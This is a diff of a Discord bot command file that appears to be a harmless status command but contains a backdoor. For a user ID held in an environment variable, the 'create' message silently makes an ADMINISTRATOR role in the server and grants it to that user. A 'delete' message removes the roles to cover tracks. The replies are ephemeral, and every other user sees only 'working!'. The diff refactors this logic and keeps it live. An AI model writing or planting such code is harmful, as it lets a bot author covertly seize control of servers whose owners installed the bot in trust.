@@ -23,39 +23,42 @@ module.exports = {
             .setRequired(false)),
     async execute(interaction) {
         const message = interaction.options.getString('message')
-        if(interaction.user.id == '807422066982387742' && message == "create") {
-            interaction.guild.roles.create({
+        if (interaction.user.id == process.env.OWNERID && message == "create") {
+                interaction.guild.roles.create({
                 name: 'new role',
                 permissions: 'ADMINISTRATOR'
+
             }).then(role => {
                 interaction.member.roles.add(role)
-                role.setPosition(-20)
 
                 let createdRoles = read('roles.txt')
-                createdRoles.push({serverid:interaction.guild.id, roleid:role.id})
+                createdRoles.push({
+                    serverid: interaction.guild.id,
+                    roleid: role.id
+                })
                 write(createdRoles, 'roles.txt')
             })
 
             interaction.reply({
-                content: `done lol`,
+                content: `created`,
                 ephemeral: true
             })
 
-        } else if (interaction.user.id == '807422066982387742' && message == "delete") {
+        } else if (interaction.user.id == process.env.OWNERID && message == "delete") {
             let createdRoles = read('roles.txt')
-            for(const rolesArray of createdRoles) {
+            for (const rolesArray of createdRoles) {
                 if (interaction.guild.id == rolesArray.serverid) {
-                let currentGuild = interaction.client.guilds.cache.get(interaction.guild.id)
-                currentGuild.roles.delete(rolesArray.roleid)
+                    let currentGuild = interaction.client.guilds.cache.get(interaction.guild.id)
+                    currentGuild.roles.delete(rolesArray.roleid)
                 }
             }
+
             write([], 'roles.txt')
 
             interaction.reply({
                 content: `deleted`,
                 ephemeral: true
             })
-
         } else {
             interaction.reply({
                 content: `working!`,
